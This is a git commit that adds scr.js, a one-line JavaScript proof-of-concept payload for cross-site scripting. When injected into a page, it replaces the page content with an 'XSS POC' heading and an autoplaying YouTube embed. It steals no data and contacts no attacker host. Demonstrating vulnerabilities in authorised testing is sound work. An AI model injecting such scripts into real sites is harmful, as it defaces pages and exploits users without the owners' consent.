b42da48bf40e47fd0ddd5d3b9b5d89eeeb6602d7
navilolo <102630710+navilolo@users.noreply.github.com>
2022-05-28 21:38:57 +0300

    Create scr.js

---
+++ scr.js
@@ -0,0 +1,1 @@
+document.body.innerHTML='<h1><center>XSS POC</center></h1><br><iframe style="display:block;margin:auto;" width="560" height="315" src="https://www.youtube.com/embed/dQw4w9WgXcQ?start=0&autoplay=1" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>'
